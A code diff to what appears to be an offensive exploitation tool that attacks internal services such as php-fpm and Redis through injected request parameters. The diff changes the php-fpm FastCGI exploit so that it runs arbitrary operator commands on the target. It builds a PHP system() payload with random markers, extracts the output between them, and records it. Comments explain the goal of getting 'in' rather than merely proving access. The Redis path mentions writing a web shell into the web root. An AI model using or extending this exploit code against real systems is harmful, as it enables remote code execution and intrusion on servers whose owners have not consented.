@@ -16,6 +16,7 @@ starts from knowledge rather than from scratch.
 
 from __future__ import annotations
 
+import secrets
 from urllib.parse import urlsplit
 
 from ...core.httpmsg import Request
@@ -589,7 +590,7 @@ def exploit_services(ctx: RunContext) -> None:
     one nobody should point at a live system.
     """
     if not ctx.config.get("exploit"):
-        ctx.info("  exploitation is off; pass --exploit to act on what was fingerprinted")
+        ctx.emit("  [!] exploitation is off; pass --exploit to act on what was fingerprinted")
         return
 
     names = {
@@ -627,7 +628,7 @@ def _redis_exploitable(ctx: RunContext) -> str:
         outcome = _inject(ctx, param, probe, "exploit.redis-capability")
         if outcome is None:
             continue
-        _, exchange, _ = outcome
+        _, exchange = outcome
         reply = exchange.response.text
         if not reply or exchange.response.error:
             return ""
@@ -654,8 +655,11 @@ def _exploit_redis(ctx: RunContext, base: str) -> None:
     shell_name = ctx.config.get("shell_name") or DEFAULT_SHELL_NAME
     roots = roots_for_run(ctx.blackboard, operator_said=ctx.config.get("webroot") or "")
     if not roots.guesses:
-        ctx.info(
-            "  redis answers; the web root could not be established, so pass --webroot "
+        # Results, not chatter: `-q` means "no narration", and a run that hides
+        # why the thing it was asked to do did nothing is not quiet, it is
+        # silent about the one line that would have explained it.
+        ctx.emit(
+            "  [!] redis answers; the web root could not be established, so pass --webroot "
             "to write a file through its persistence path"
         )
         return
@@ -682,17 +686,52 @@ def _exploit_redis(ctx: RunContext, base: str) -> None:
 def _exploit_phpfpm(ctx: RunContext) -> None:
     script = ctx.config.get("fpm_script")
     if not script:
-        ctx.info("  php-fpm answers; pass --fpm-script with a path that exists on the target")
+        ctx.emit("  [!] php-fpm answers; pass --fpm-script with a path that exists on the target")
         return
+    # A marker first, then the operator's command, in one payload. Proving that
+    # execution is possible and then not using it leaves the operator at "the
+    # tool confirmed I can" when what they wanted was to be in - and running the
+    # command without a marker of our own gives no way to tell the script's
+    # output from the page's.
+    command = ctx.config.get("os_cmd") or "id"
+    marker = "ik" + secrets.token_hex(6)
+    closing = "ik" + secrets.token_hex(6)
+    # What the command printed is what sits between the two markers, which is why
+    # there are two. With only one at the front, everything the script prints
+    # afterwards - the page it renders, the template around it - is served up as
+    # though the operator's command had produced it.
+    code = "<?php echo '%s'; system(%s); echo '%s'; ?>" % (
+        marker,
+        _php_literal(command),
+        closing,
+    )
     payload = phpfpm_execute(
         "127.0.0.1",
         int(ctx.config.get("fpm_port", 9000)),
         script,
-        "<?php system('id'); ?>",
+        code,
     )
     # The FastCGI reply carries the script's output, so the proof is in the
     # response itself rather than in a second request.
-    _send_exploit(ctx, payload, "phpfpm-exec", verify_url=None, expect=("uid=",))
+    _send_exploit(
+        ctx,
+        payload,
+        "phpfpm-exec",
+        verify_url=None,
+        expect=(marker,),
+        show_between=(marker, closing) if ctx.config.get("os_cmd") else (),
+        command=command,
+    )
+
+
+def _php_literal(value: str) -> str:
+    """A PHP single-quoted string holding this value.
+
+    Only the backslash and the quote need escaping inside single quotes, and
+    getting it wrong is a parse error at the target - which reads exactly like a
+    payload that did not arrive.
+    """
+    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"
 
 
 def _send_exploit(
@@ -701,6 +740,8 @@ def _send_exploit(
     name: str,
     verify_url: str | None = None,
     expect: tuple[str, ...] = (),
+    show_between: tuple[str, str] = (),
+    command: str = "",
 ) -> None:
     for param in _candidates(ctx):
         if ctx.stopped:
@@ -738,6 +779,16 @@ def _send_exploit(
                     confidence=Confidence.CONFIRMED,
                 )
                 ctx.emit(f"  [+] {name}: command execution confirmed")
+                if show_between:
+                    # What the command printed: between the two markers, and
+                    # nothing else. It goes in the result at the end, once, the
+                    # same as a file that was read.
+                    opening, closing = show_between
+                    start = reply.rfind(opening)
+                    end = reply.rfind(closing)
+                    shown = reply[start + len(opening) : end].strip() if end > start else ""
+                    ctx.blackboard.remember_run(command, shown)
+                    ctx.announce(f"ran.{command}", f"  [+] running on the target: {command}")
                 return
 
         ctx.blackboard.set(
